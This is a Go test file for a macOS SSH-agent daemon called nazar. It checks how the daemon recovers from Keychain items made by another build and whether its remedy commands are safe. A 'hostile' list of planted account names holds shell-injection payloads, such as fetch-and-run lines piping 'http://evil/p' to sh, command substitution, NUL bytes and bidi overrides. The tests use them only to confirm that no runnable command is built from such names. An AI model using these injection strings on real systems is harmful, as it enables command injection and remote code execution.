package daemon

import (
	"errors"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/atas/nazar/core/configstage"
	"github.com/atas/nazar/core/control"
	"github.com/atas/nazar/core/keys"
	"github.com/atas/nazar/core/layout"
	"github.com/atas/nazar/core/platform/fake"
	"github.com/atas/nazar/core/trust"
)

// otherBuildVault is the vault after an ad-hoc rebuild of Nazar.app (every
// rebuild is a new program to the Keychain), or after any other new
// signature of the agent: the items the previous build made are listed,
// but this build can neither read, replace nor delete them, the way
// securityd refuses the Swift KeychainVault's read and SecItemDelete of an
// item whose access list trusts another program (for example
// `nazar ssh-key delete github` → "vault delete failed (status
// 1)"). The user's `security delete-generic-password` removes one
// (securityDelete) and frees the name.
type otherBuildVault struct {
	*fake.Vault
	mu      sync.Mutex
	foreign map[string]bool
}

var errOtherBuild = errors.New("platform: vault get failed (status 1)")

func (v *otherBuildVault) isForeign(name string) bool {
	v.mu.Lock()
	defer v.mu.Unlock()
	return v.foreign[name]
}

func (v *otherBuildVault) Get(name string) ([]byte, error) {
	if v.isForeign(name) {
		return nil, errOtherBuild
	}
	return v.Vault.Get(name)
}

func (v *otherBuildVault) Put(name string, value []byte) error {
	if v.isForeign(name) {
		return errors.New("platform: vault put failed (status 1)")
	}
	return v.Vault.Put(name, value)
}

// Delete is nazar-agent's own delete: an item of another build is refused.
func (v *otherBuildVault) Delete(name string) error {
	if v.isForeign(name) {
		return errors.New("platform: vault delete failed (status 1)")
	}
	return v.Vault.Delete(name)
}

// securityDelete is what the user's `security delete-generic-password -s
// dev.nazar -a <name>` does: the item goes, whoever made it.
func (v *otherBuildVault) securityDelete(name string) error {
	v.mu.Lock()
	delete(v.foreign, name)
	v.mu.Unlock()
	return v.Vault.Delete(name)
}

const keyConfig = `apiVersion: nazar/v1
kind: Config
ssh_agent:
  keys:
    github:
      scope: use
      gate: login
`

// startAfterRebuild starts the daemon on a vault whose four items belong
// to another build, with keyConfig on disk (approved by that build).
func startAfterRebuild(t *testing.T) (*env, *otherBuildVault) {
	t.Helper()
	return startAfterRebuildWith(t, func(string) string { return keyConfig })
}

// startAfterRebuildWith is startAfterRebuild with config.yaml made by cfg
// from the test's home directory.
func startAfterRebuildWith(t *testing.T, cfg func(home string) string) (*env, *otherBuildVault) {
	t.Helper()
	var v *otherBuildVault
	e := startWith(t, func(f *fake.Fake, o *Options) {
		o.Now = f.Now
		inner := o.Vault.(*fake.Vault)
		for _, n := range []string{PromptsVaultItem, configstage.ApprovedVaultItem, trust.VaultItem, keys.VaultPrefix + "github"} {
			inner.Put(n, []byte("written by the previous build"))
		}
		v = &otherBuildVault{Vault: inner, foreign: map[string]bool{PromptsVaultItem: true, configstage.ApprovedVaultItem: true,
			trust.VaultItem: true, keys.VaultPrefix + "github": true}}
		o.Vault = v
		p := layout.ConfigFile(o.Home)
		os.MkdirAll(filepath.Dir(p), 0o700)
		os.WriteFile(p, []byte(cfg(o.Home)), 0o600)
	})
	return e, v
}

// The app starts; every unreadable item is reported with what it means and
// the command that fixes it, in the order that fixes them (prompt record,
// trust store, approved config, keys); nothing fails open.
func TestStartsWithItemsOfAnotherBuild(t *testing.T) {
	e, _ := startAfterRebuild(t)
	var st control.Status
	if err := e.call(t, control.CmdStatus, nil, control.KindStatus, &st); err != nil {
		t.Fatal(err)
	}
	var items []string
	for _, p := range st.Vault {
		items = append(items, p.Item)
		if !strings.Contains(p.Reason, "another signature of the agent") || p.Effect == "" || p.Remedy == "" {
			t.Errorf("%s: %+v", p.Item, p)
		}
	}
	if got := strings.Join(items, ","); got != "config/prompts,state/trust,config/approved,ssh-key/github" {
		t.Fatalf("vault problems %q", got)
	}
	if !strings.HasPrefix(st.Vault[0].Remedy, "security delete-generic-password -s dev.nazar -a config/prompts") {
		t.Fatalf("remedy %q", st.Vault[0].Remedy)
	}
	if st.Vault[3].Remedy != keyCheckFirst+"security delete-generic-password -s dev.nazar -a ssh-key/github, then nazar ssh-key create github, "+
		"then add the new public key (~/.nazar/keys/github.pub) where the old one was" {
		t.Fatalf("key remedy %q", st.Vault[3].Remedy)
	}
	// Never fail open: the approved config is unknown, so the built-in
	// default (every key blocked) is in force and the file is staged.
	if len(e.d.stager.Active().SSHAgent.Keys) != 0 || st.Staged == nil || !st.Staged.Loosens {
		t.Fatalf("want the default active and config.yaml staged: active %+v staged %+v", e.d.stager.Active().SSHAgent.Keys, st.Staged)
	}
	if e.logins() != 0 {
		t.Fatal("no prompt may open while the prompt record can't be written")
	}
	var list control.SSHKeyList
	if err := e.call(t, control.CmdSSHKeyList, nil, control.KindSSHKeyList, &list); err != nil {
		t.Fatal(err)
	}
	if len(list.Items) != 1 || list.Items[0].Usable || !strings.Contains(list.Items[0].UnusableReason, "another signature of the agent") ||
		!strings.Contains(list.Items[0].Remedy, "nazar ssh-key create github") {
		t.Fatalf("%+v", list.Items)
	}
	// config apply is refused without a prompt while config/prompts is
	// unreadable: the opening prompt can't be recorded.
	if _, p := e.apply(t); p.ExitCode() != control.ExitError || e.logins() != 0 {
		t.Fatalf("apply: %+v (logins %d)", p, e.logins())
	}
}

// Following the remedies in order brings everything back without a restart.
func TestRemediesInOrderRecover(t *testing.T) {
	e, v := startAfterRebuild(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	v.securityDelete(PromptsVaultItem)
	// The approved config can't be replaced yet: approved, not applied.
	if _, p := e.apply(t); p.ExitCode() == control.ExitOK {
		t.Fatal("applied over an item of another build")
	}
	e.f.Advance(configApplyCooldown + time.Second)
	v.securityDelete(trust.VaultItem)
	v.securityDelete(configstage.ApprovedVaultItem)
	if diff, p := e.apply(t); p != nil || !diff.Applied {
		t.Fatalf("apply after deleting config/approved: %+v %+v", diff, p)
	}
	if e.d.stager.Active().SSHAgent.Keys["github"] == nil {
		t.Fatal("config not in force")
	}
	e.f.Advance(configApplyCooldown + time.Second)
	var k control.SSHKey
	if err := v.securityDelete(keys.VaultPrefix + "github"); err != nil { // the fix's first step, typed by the user
		t.Fatal(err)
	}
	if err := e.call(t, control.CmdSSHKeyCreate, map[string]string{"name": "github"}, control.KindSSHKey, &k); err != nil {
		t.Fatalf("create it again: %v", err)
	}
	// login + scope use on every policy: the chip's user presence (S1).
	if !k.Usable || !k.UserPresence || !k.Configured {
		t.Fatalf("re-created key %+v", k)
	}
	if e.readConfig(t) != keyConfig {
		t.Fatalf("re-creating must keep config.yaml as it is:\n%s", e.readConfig(t))
	}
	var st control.Status
	e.call(t, control.CmdStatus, nil, control.KindStatus, &st)
	if len(st.Vault) != 0 {
		t.Fatalf("still reported: %+v", st.Vault)
	}
}

// matcherConfig is keyConfig with an app: matcher (iTerm, installed in
// the fake) and a signed: matcher in the key's rules: approving it pins
// iTerm's team in the trust store; signed: needs no trust.
func matcherConfig(home string) string {
	return `apiVersion: nazar/v1
kind: Config
apps:
  iterm: {app: com.googlecode.iterm2}
  tool: {signed: {team: TOOLTEAM01, id: tool}}
ssh_agent:
  keys:
    github:
      scope: use
      gate: login
      rules:
        - apps: [iterm]
          scope: session
          gate: login
        - apps: [tool]
          scope: session
          gate: login
`
}

// startAfterRebuildWithMatchers is that rebuild with matcherConfig on
// disk.
func startAfterRebuildWithMatchers(t *testing.T) (*env, *otherBuildVault) {
	t.Helper()
	e, v := startAfterRebuildWith(t, matcherConfig)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	return e, v
}

var (
	deleteStep    = regexp.MustCompile(`^security delete-generic-password -s dev\.nazar -a ([A-Za-z0-9._/-]+)$`)
	keyCreateStep = regexp.MustCompile(`^nazar ssh-key create ([A-Za-z0-9._-]+)$`)
	pubKeyStep    = regexp.MustCompile(`^add the new public key \(~/\.nazar/keys/[A-Za-z0-9._-]+\.pub\) where the old one was$`)
	trustAppFix   = regexp.MustCompile(`^nazar trust --app ([A-Za-z0-9._-]+)$`)
)

// followRemedies does what the listed remedies say, top to bottom and
// literally: every step of every remedy must be one it knows (the commands
// the user would paste, or the re-trust step, which runs the fixes `nazar
// apps list` names), and must succeed. No remedy chains steps with &&: a
// step that finds nothing left to do (the key already gone) would stop
// the rest.
func (e *env) followRemedies(t *testing.T, v *otherBuildVault, problems []control.VaultProblem) {
	t.Helper()
	for _, p := range problems {
		if strings.Contains(p.Remedy, "&&") {
			t.Fatalf("%s: remedy %q chains steps with &&", p.Item, p.Remedy)
		}
		for _, step := range strings.Split(strings.TrimPrefix(p.Remedy, keyCheckFirst), ", then ") {
			e.followStep(t, v, p.Item, step)
		}
	}
}

func (e *env) followStep(t *testing.T, v *otherBuildVault, item, step string) {
	t.Helper()
	var k control.SSHKey
	switch m := []string(nil); {
	case step == retrust:
		var apps control.AppList
		if err := e.call(t, control.CmdAppsList, nil, control.KindAppList, &apps); err != nil {
			t.Fatalf("%s: apps list: %v", item, err)
		}
		for _, a := range apps.Items {
			if a.Fix == "" {
				continue
			}
			if m := trustAppFix.FindStringSubmatch(a.Fix); m != nil {
				if _, p := e.trustApp(t, m[1]); p != nil {
					t.Fatalf("%s: %s: %+v", item, a.Fix, p)
				}
			} else {
				t.Fatalf("%s: apps list fix %q is not a trust command", item, a.Fix)
			}
		}
	case func() bool { m = deleteStep.FindStringSubmatch(step); return m != nil }():
		if err := v.securityDelete(m[1]); err != nil {
			t.Fatalf("%s: %s: %v", item, step, err)
		}
	case step == "nazar config apply":
		if diff, p := e.apply(t); p != nil || !diff.Applied {
			t.Fatalf("%s: %s: %+v %+v", item, step, diff, p)
		}
	case func() bool { m = keyCreateStep.FindStringSubmatch(step); return m != nil }():
		if err := e.call(t, control.CmdSSHKeyCreate, map[string]string{"name": m[1]}, control.KindSSHKey, &k); err != nil {
			t.Fatalf("%s: %s: %v", item, step, err)
		}
		if !k.Usable || !k.Configured {
			t.Fatalf("%s: re-created key %+v", item, k)
		}
	case pubKeyStep.MatchString(step):
		// Outside nazar: the user puts the new public key on the server.
	default:
		t.Fatalf("%s: remedy step %q is not one the user can follow", item, step)
	}
}

// An ad-hoc rebuild with app: and signed: matchers in the config:
// the remedies, followed top to bottom exactly as listed, lead back to a
// working state with no restart: no vault problem, the config in force,
// iTerm pinned again by the config approval, the
// key usable under its kept entry, and every prompt approved on the first
// try (none was wasted on a step that could not work yet).
func TestRemediesListedInOrderRecoverWithMatchers(t *testing.T) {
	e, v := startAfterRebuildWithMatchers(t)
	st := e.status(t)
	var items []string
	for _, p := range st.Vault {
		items = append(items, p.Item)
	}
	if got := strings.Join(items, ","); got != "config/prompts,state/trust,config/approved,ssh-key/github" {
		t.Fatalf("vault problems %q", got)
	}
	written := e.readConfig(t)
	e.followRemedies(t, v, st.Vault)

	if st := e.status(t); len(st.Vault) != 0 {
		t.Fatalf("still reported: %+v", st.Vault)
	}
	if e.d.stager.Active().SSHAgent.Keys["github"] == nil || e.readConfig(t) != written {
		t.Fatalf("config not in force, or config.yaml changed:\n%s", e.readConfig(t))
	}
	if team, ok := e.d.trust.PinnedTeam("com.googlecode.iterm2"); !ok || team != fake.ITermCode.Team() {
		t.Fatalf("iTerm not pinned again: %q %v", team, ok)
	}
	var apps control.AppList
	if err := e.call(t, control.CmdAppsList, nil, control.KindAppList, &apps); err != nil {
		t.Fatal(err)
	}
	for _, a := range apps.Items {
		if a.Problem != "" {
			t.Fatalf("matcher %s still unusable: %s (fix %s)", a.Name, a.Problem, a.Fix)
		}
	}
	var list control.SSHKeyList
	if err := e.call(t, control.CmdSSHKeyList, nil, control.KindSSHKeyList, &list); err != nil {
		t.Fatal(err)
	}
	if len(list.Items) != 1 || !list.Items[0].Usable {
		t.Fatalf("ssh-key list %+v", list.Items)
	}
	// prompts: config apply, key create; nothing was refused,
	// so no cooldown was ever started. The key needs no delete prompt: its
	// item is removed by hand.
	if n := e.logins(); n != 2 {
		t.Fatalf("%d login prompts, want 2 (config apply, key create)", n)
	}
}

// Why state/trust comes before config/approved: approving a config with an
// app: matcher records its pin in the trust store, which refuses every
// write while its item is another build's. In the old order (approved
// config before the trust store) the user passes the login prompt and the
// change is still not applied.
func TestApplyBeforeTrustStoreIsFixedFails(t *testing.T) {
	e, v := startAfterRebuildWithMatchers(t)
	v.securityDelete(PromptsVaultItem)
	v.securityDelete(configstage.ApprovedVaultItem)
	if _, p := e.apply(t); p == nil || e.logins() != 1 {
		t.Fatalf("apply with state/trust unreadable: %+v (logins %d): want an approved prompt and no change", p, e.logins())
	}
	if e.d.stager.Active().SSHAgent.Keys["github"] != nil {
		t.Fatal("the config took effect without its pin")
	}
	// The remedies say so: state/trust is listed before config/approved,
	// and only deleted there, with the re-trust after the config apply.
	st := e.status(t)
	if len(st.Vault) < 2 || st.Vault[0].Item != trust.VaultItem || st.Vault[0].Remedy != deleteItem(trust.VaultItem) ||
		st.Vault[1].Item != configstage.ApprovedVaultItem ||
		st.Vault[1].Remedy != deleteItem(configstage.ApprovedVaultItem)+", then nazar config apply, then "+retrust {
		t.Fatalf("vault problems %+v", st.Vault)
	}
}

// Only the trust store unreadable (the approved config read fine): its
// remedy carries the re-trust step itself; only the approved config
// unreadable: no re-trust step.
func TestTrustRemedyStandsAlone(t *testing.T) {
	e, v := startAfterRebuild(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	v.securityDelete(PromptsVaultItem)
	v.securityDelete(configstage.ApprovedVaultItem)
	v.securityDelete(keys.VaultPrefix + "github")
	// keyConfig has no app: matcher, so the apply needs no pin.
	if diff, p := e.apply(t); p != nil || !diff.Applied {
		t.Fatalf("apply: %+v %+v", diff, p)
	}
	st := e.status(t)
	if len(st.Vault) != 1 || st.Vault[0].Item != trust.VaultItem || st.Vault[0].Remedy != deleteItem(trust.VaultItem)+", then "+retrust {
		t.Fatalf("vault problems %+v", st.Vault)
	}
	e.followRemedies(t, v, st.Vault)
	if st := e.status(t); len(st.Vault) != 0 {
		t.Fatalf("still reported: %+v", st.Vault)
	}

	e2, v2 := startAfterRebuild(t)
	v2.securityDelete(PromptsVaultItem)
	v2.securityDelete(trust.VaultItem)
	v2.securityDelete(keys.VaultPrefix + "github")
	// config/prompts stays listed until a prompt writes it again.
	st = e2.status(t)
	if len(st.Vault) != 2 || st.Vault[0].Item != PromptsVaultItem || st.Vault[1].Item != configstage.ApprovedVaultItem ||
		st.Vault[1].Remedy != deleteItem(configstage.ApprovedVaultItem)+", then nazar config apply" {
		t.Fatalf("vault problems %+v", st.Vault)
	}
}

// Re-creating refuses --scope/--gate (create takes none) and a key
// that still exists; the entry's policies decide the chip's user presence.
func TestRecreateRefusals(t *testing.T) {
	e := start(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	create := func(args map[string]string) (control.SSHKey, *control.Problem) {
		var k control.SSHKey
		err := e.call(t, control.CmdSSHKeyCreate, args, control.KindSSHKey, &k)
		return k, control.AsProblem(err)
	}
	if _, p := create(map[string]string{"name": "github"}); p != nil { // from the iTerm2 tab: block, plus its login/session rule
		t.Fatal(p)
	}
	written := e.readConfig(t)
	if _, p := create(map[string]string{"name": "github", "gate": "dialog"}); p.ExitCode() != control.ExitUsage {
		t.Fatalf("--gate on an existing entry: %+v", p)
	}
	if _, p := create(map[string]string{"name": "github"}); p.ExitCode() != control.ExitError || !strings.Contains(p.Message, "delete it first") {
		t.Fatalf("existing key: %+v", p)
	}
	if err := e.call(t, control.CmdSSHKeyDelete, map[string]string{"name": "github"}, control.KindSSHKey, &control.SSHKey{}); err != nil {
		t.Fatal(err)
	}
	k, p := create(map[string]string{"name": "github"})
	if p != nil || !k.Usable || k.UserPresence {
		t.Fatalf("re-create under a session rule: %+v %+v (a remembered login never gets the chip's user presence)", k, p)
	}
	if e.readConfig(t) != written {
		t.Fatal("re-creating must not edit config.yaml")
	}
	if n := e.f.CountShown(fake.KindAuthenticate); n != 3 {
		t.Fatalf("%d login prompts, want 3 (create, delete, create again)", n)
	}
}

// hostile are planted ssh-key/ accounts no remedy may put in a command:
// shell syntax of every macOS shell (tcsh and csh expand ! even inside
// single quotes), quotes, control bytes, a NUL, bidi overrides, non-ASCII.
var hostile = []string{
	"x; curl http://evil/p | sh; nazar ssh-key delete", "x'; curl http://evil/p | sh; echo '",
	"x\n$(curl http://evil/p)\x1b[2K\u202e", "x\x01'; curl http://evil/p | sh; echo \\'", ";touch X;#'\u00e9!#",
	"!#", "x!!", "a'b!-2", "`touch X`", "$(touch X)", "${HOME}", "$HOME", "\"x\"", "x\ny", "x\ry", "a b", "x\ttab",
	"github\x00evil", "\x00", "x\u202egnp.exe", "x\u2066y\u2069", "github\u200b", "\u0430pple", "~root", "x*", "x?", "[x]", "{a,b}",
	"x#y", "x%1", "x^y", "x=y", "x\\y", "x,y", "x:y", "x@y", "x+y",
}

// A planted Keychain item under nazar's service whose account is not a key
// name nazar can make (any same-user process, a sandboxed one included,
// can add one) is reported as such, named only Go-quoted. No quoting is
// safe in every shell the user may paste into, so an account that is not
// a plain word gets no command at all: the remedy is exactly "remove it by
// hand in Keychain Access" with the account Go-quoted (printable ASCII, no
// control or bidi character).
func TestForeignKeyItemWithHostileNameGetsNoCommand(t *testing.T) {
	for _, name := range hostile {
		t.Run("", func(t *testing.T) {
			e := start(t)
			if err := e.vault.Put(keys.VaultPrefix+name, []byte("planted")); err != nil {
				t.Fatal(err)
			}
			var st control.Status
			if err := e.call(t, control.CmdStatus, nil, control.KindStatus, &st); err != nil {
				t.Fatal(err)
			}
			if len(st.Vault) != 1 {
				t.Fatalf("vault problems %+v", st.Vault)
			}
			var list control.SSHKeyList
			if err := e.call(t, control.CmdSSHKeyList, nil, control.KindSSHKeyList, &list); err != nil {
				t.Fatal(err)
			}
			if len(list.Items) != 1 || list.Items[0].Usable {
				t.Fatalf("ssh-key list %+v", list.Items)
			}
			p, k := st.Vault[0], list.Items[0]
			// Text for reading names the item only in Go quoting (ASCII,
			// every control and non-ASCII rune escaped).
			quoted := strconv.QuoteToASCII(keys.VaultPrefix + name)
			if strings.Contains(p.Effect, name) {
				t.Errorf("status effect carries the name raw: %q", p.Effect)
			}
			for what, s := range map[string]string{"status item": p.Item, "status reason": p.Reason, "list reason": k.UnusableReason} {
				if !strings.Contains(s, quoted) || strings.Contains(strings.ReplaceAll(s, quoted, ""), name) {
					t.Errorf("%s does not name the item only as %s: %q", what, quoted, s)
				}
			}
			if p.Item != quoted {
				t.Errorf("status item %q, want %s", p.Item, quoted)
			}
			want := "remove it by hand in Keychain Access: service dev.nazar, account shown as " + quoted
			for what, r := range map[string]string{"status": p.Remedy, "list": k.Remedy} {
				if r != want {
					t.Errorf("%s remedy %q, want %q", what, r, want)
				}
				if fixed := strings.TrimSuffix(r, quoted); strings.Contains(fixed, "security") || strings.Contains(fixed, "nazar ssh-key") {
					t.Errorf("%s remedy %q holds a command", what, r)
				}
				for i := 0; i < len(r); i++ {
					if r[i] < 0x20 || r[i] > 0x7e {
						t.Errorf("%s remedy %q has byte %#x outside printable ASCII", what, r, r[i])
					}
				}
			}
			if !strings.Contains(p.Reason, "not a key nazar made") || !strings.Contains(k.UnusableReason, "not a key nazar made") {
				t.Fatalf("reasons %q / %q", p.Reason, k.UnusableReason)
			}
		})
	}
}

// A planted account that is a plain word (only A-Z a-z 0-9 . _ / -) but
// not a valid key name gets the security command, the account bare, and
// never a nazar command.
func TestForeignKeyItemWithPlainNameGetsDeleteCommand(t *testing.T) {
	for _, name := range []string{"a/b", "-rf", "..", "x..y", ".hidden", "_x", "a" + strings.Repeat("b", 64), "../../config/approved"} {
		e := start(t)
		if err := e.vault.Put(keys.VaultPrefix+name, []byte("planted")); err != nil {
			t.Fatal(err)
		}
		st := e.status(t)
		if len(st.Vault) != 1 {
			t.Fatalf("%q: vault problems %+v", name, st.Vault)
		}
		if r := st.Vault[0].Remedy; r != "security delete-generic-password -s dev.nazar -a ssh-key/"+name {
			t.Errorf("%q: remedy %q", name, r)
		}
	}
}

// keyRemedy itself never builds a nazar command from an invalid name, and
// never a command from a name that is not a plain word, so no future
// caller can regress.
func TestKeyRemedyRefusesInvalidNames(t *testing.T) {
	want := keyCheckFirst + "security delete-generic-password -s dev.nazar -a ssh-key/github, then nazar ssh-key create github, " +
		"then add the new public key (~/.nazar/keys/github.pub) where the old one was"
	if r := keyRemedy("github"); r != want {
		t.Fatalf("valid name: %q, want %q", r, want)
	}
	// A locked keychain or a wrongly signed agent reads as the same
	// unreadable item, and deleting it destroys a key the right agent
	// would still read: the check that loses nothing comes first, and the
	// delete is said to be final, before the delete command.
	r := keyRemedy("github")
	del := strings.Index(r, "security delete-generic-password")
	for _, w := range []string{"locked, unlock it", "reinstall", "nazar status again", "for good"} {
		if i := strings.Index(r, w); i < 0 || i > del {
			t.Errorf("valid name: %q must come before the delete in %q", w, r)
		}
	}
	for _, name := range hostile {
		if r := keyRemedy(name); r != removeByHand(name) || r != "remove it by hand in Keychain Access: service dev.nazar, account shown as "+foreignItem(name) {
			t.Errorf("%q: %q", name, r)
		}
	}
	if r := keyRemedy("a/b"); r != "security delete-generic-password -s dev.nazar -a ssh-key/a/b" {
		t.Fatalf("plain invalid name: %q", r)
	}
	for _, s := range []string{"a b", "a!", "a'", "", "a\x00", "\u00e9", "a\n"} {
		if plainWord(s) {
			t.Errorf("plainWord(%q)", s)
		}
	}
}

// Re-creating a key under an existing entry needs the login prompt to be
// approved: denied, nothing is created, config.yaml is untouched, the
// denial is audited and the cooldown starts.
func TestRecreateDeniedIsRefused(t *testing.T) {
	e := start(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	if err := e.call(t, control.CmdSSHKeyCreate, map[string]string{"name": "github"}, control.KindSSHKey, &control.SSHKey{}); err != nil {
		t.Fatal(err)
	}
	if err := e.call(t, control.CmdSSHKeyDelete, map[string]string{"name": "github"}, control.KindSSHKey, &control.SSHKey{}); err != nil {
		t.Fatal(err)
	}
	written := e.readConfig(t)
	before := len(e.sink.Lines())
	e.f.SetDefaults(fake.Answer{}, fake.Answer{})
	p := control.AsProblem(e.call(t, control.CmdSSHKeyCreate, map[string]string{"name": "github"}, control.KindSSHKey, &control.SSHKey{}))
	if p.ExitCode() != control.ExitRefused || !strings.Contains(p.Message, "not created") {
		t.Fatalf("denied re-create: %+v", p)
	}
	if n := e.logins(); n != 3 {
		t.Fatalf("%d login prompts, want 3 (create, delete, create again)", n)
	}
	var list control.SSHKeyList
	if err := e.call(t, control.CmdSSHKeyList, nil, control.KindSSHKeyList, &list); err != nil {
		t.Fatal(err)
	}
	if len(list.Items) != 0 {
		t.Fatalf("a key was created on a denied prompt: %+v", list.Items)
	}
	if _, err := e.vault.Get(keys.VaultPrefix + "github"); err == nil {
		t.Fatal("a vault record was written on a denied prompt")
	}
	if e.readConfig(t) != written {
		t.Fatal("a denied re-create must not edit config.yaml")
	}
	var denied int
	for _, l := range e.sink.Lines()[before:] {
		if strings.Contains(l, "ssh:github") && strings.Contains(l, "create key again") && !strings.Contains(l, "approved,") {
			denied++
		}
	}
	if denied != 1 {
		t.Fatalf("want one audit line for the denied re-create:\n%s", strings.Join(e.sink.Lines()[before:], "\n"))
	}
	// The denial starts the cooldown: asking again at once shows no prompt.
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	p = control.AsProblem(e.call(t, control.CmdSSHKeyCreate, map[string]string{"name": "github"}, control.KindSSHKey, &control.SSHKey{}))
	if p.ExitCode() != control.ExitRefused || e.logins() != 3 {
		t.Fatalf("re-create right after a denial: %+v (logins %d)", p, e.logins())
	}
}

// No shell can pass a NUL byte in an argument: bash and zsh cut the word
// there. A remedy for a planted account "ssh-key/github\x00evil" written as
// a security command would therefore delete ssh-key/github, the user's
// real key. Such an account gets no runnable remedy at all.
func TestForeignKeyItemWithNULGetsNoCommand(t *testing.T) {
	e := start(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	if err := e.call(t, control.CmdSSHKeyCreate, map[string]string{"name": "github"}, control.KindSSHKey, &control.SSHKey{}); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"github\x00evil", "\x00", "x'\x00'; touch X"} {
		if err := e.vault.Put(keys.VaultPrefix+name, []byte("planted")); err != nil {
			t.Fatal(err)
		}
	}
	var st control.Status
	if err := e.call(t, control.CmdStatus, nil, control.KindStatus, &st); err != nil {
		t.Fatal(err)
	}
	var list control.SSHKeyList
	if err := e.call(t, control.CmdSSHKeyList, nil, control.KindSSHKeyList, &list); err != nil {
		t.Fatal(err)
	}
	if len(st.Vault) != 3 {
		t.Fatalf("vault problems %+v, want the three planted items", st.Vault)
	}
	remedies := map[string]string{}
	for i, p := range st.Vault {
		remedies["status "+strconv.Itoa(i)] = p.Remedy
	}
	var foreign int
	for _, k := range list.Items {
		if k.Name == "github" {
			if !k.Usable {
				t.Fatalf("the real key is unusable: %+v", k)
			}
			continue
		}
		foreign++
		remedies["list "+k.Name] = k.Remedy
	}
	if foreign != 3 {
		t.Fatalf("ssh-key list %+v", list.Items)
	}
	for what, r := range remedies {
		if r == "" || strings.Contains(r, "security") || strings.Contains(r, "-a ") || strings.Contains(r, "nazar ssh-key") ||
			strings.IndexByte(r, 0) >= 0 || !strings.Contains(r, "Keychain Access") {
			t.Errorf("%s remedy %q: want no command, only the way to remove it by hand", what, r)
		}
	}
}

// The case: nazar-agent can't delete an SSH key item of
// another signature, so `nazar ssh-key delete` of an unreadable key is
// refused before any prompt (no Touch ID for a delete that can't work, no
// cooldown) with the fix, and nothing changes.
func TestDeleteOfAnUnreadableKeyIsRefusedWithTheFix(t *testing.T) {
	e, v := startAfterRebuild(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	// Prompts can open again: the refusal must not come from claimLogin.
	if err := v.securityDelete(PromptsVaultItem); err != nil {
		t.Fatal(err)
	}
	p := control.AsProblem(e.call(t, control.CmdSSHKeyDelete, map[string]string{"name": "github"}, control.KindSSHKey, &control.SSHKey{}))
	want := "SSH key github can't be deleted by this nazar-agent: its Keychain item belongs to another signature of the agent, " +
		"or the login keychain is locked; nothing was changed. To fix it: " + keyRemedy("github")
	if p.ExitCode() != control.ExitError || p.Message != want {
		t.Fatalf("delete of an unreadable key: %+v\nwant %q", p, want)
	}
	if n := e.logins(); n != 0 {
		t.Fatalf("%d login prompts: the refusal comes before any prompt", n)
	}
	if _, err := v.Vault.Get(keys.VaultPrefix + "github"); err != nil || !v.isForeign(keys.VaultPrefix+"github") {
		t.Fatalf("the item changed: %v", err)
	}
	// Nothing was asked, so nothing cools down: the fix's last step
	// prompts at once once the item is gone (here after the config the
	// key's entry lives in is in force again).
	v.securityDelete(trust.VaultItem)
	v.securityDelete(configstage.ApprovedVaultItem)
	if diff, p := e.apply(t); p != nil || !diff.Applied {
		t.Fatalf("apply: %+v %+v", diff, p)
	}
	v.securityDelete(keys.VaultPrefix + "github")
	var k control.SSHKey
	if err := e.call(t, control.CmdSSHKeyCreate, map[string]string{"name": "github"}, control.KindSSHKey, &k); err != nil || !k.Usable {
		t.Fatalf("create after the fix: %+v %v", k, err)
	}
	if n := e.logins(); n != 2 {
		t.Fatalf("%d login prompts, want 2 (config apply, key create)", n)
	}
}

// After the item was removed by hand, the old fix's first step (`nazar
// ssh-key delete github`) finds no key: it says so, names the step that is
// left, and shows no prompt. A name with no entry gets the plain message.
func TestDeleteOfAGoneKeyNamesCreate(t *testing.T) {
	e := start(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	if err := e.call(t, control.CmdSSHKeyCreate, map[string]string{"name": "github"}, control.KindSSHKey, &control.SSHKey{}); err != nil {
		t.Fatal(err)
	}
	if err := e.vault.Delete(keys.VaultPrefix + "github"); err != nil { // `security delete-generic-password …`
		t.Fatal(err)
	}
	before := e.logins()
	del := func(name string) *control.Problem {
		return control.AsProblem(e.call(t, control.CmdSSHKeyDelete, map[string]string{"name": name}, control.KindSSHKey, &control.SSHKey{}))
	}
	if p := del("github"); p.ExitCode() != control.ExitError ||
		p.Message != `no SSH key named "github"; config.yaml keeps its entry: nazar ssh-key create github makes a key for it` {
		t.Fatalf("delete of a gone key with an entry: %+v", p)
	}
	if p := del("nope"); p.ExitCode() != control.ExitError || p.Message != `no SSH key named "nope"` {
		t.Fatalf("delete of a name with no entry: %+v", p)
	}
	if e.logins() != before {
		t.Fatal("a delete of no key showed a prompt")
	}
	var k control.SSHKey
	if err := e.call(t, control.CmdSSHKeyCreate, map[string]string{"name": "github"}, control.KindSSHKey, &k); err != nil || !k.Usable || !k.Configured {
		t.Fatalf("the step it names: %+v %v", k, err)
	}
}

// Only the key unreadable (the other items fixed already): the listed fix,
// followed literally, makes the key usable with one prompt (the create)
// and leaves config.yaml as it was.
func TestUnreadableKeyRemedyWorksTopToBottom(t *testing.T) {
	e, v := startAfterRebuild(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{})
	for _, item := range []string{PromptsVaultItem, trust.VaultItem, configstage.ApprovedVaultItem} {
		if err := v.securityDelete(item); err != nil {
			t.Fatal(err)
		}
	}
	if diff, p := e.apply(t); p != nil || !diff.Applied { // keyConfig has no app: matcher: no re-trust step
		t.Fatalf("apply: %+v %+v", diff, p)
	}
	st := e.status(t)
	if len(st.Vault) != 1 || st.Vault[0].Item != keys.VaultPrefix+"github" || st.Vault[0].Remedy != keyRemedy("github") {
		t.Fatalf("vault problems %+v", st.Vault)
	}
	before := e.logins()
	e.followRemedies(t, v, st.Vault)
	if n := e.logins() - before; n != 1 {
		t.Fatalf("%d login prompts, want 1 (create)", n)
	}
	if st := e.status(t); len(st.Vault) != 0 {
		t.Fatalf("still reported: %+v", st.Vault)
	}
	if e.readConfig(t) != keyConfig {
		t.Fatalf("the fix must keep config.yaml as it is:\n%s", e.readConfig(t))
	}
}
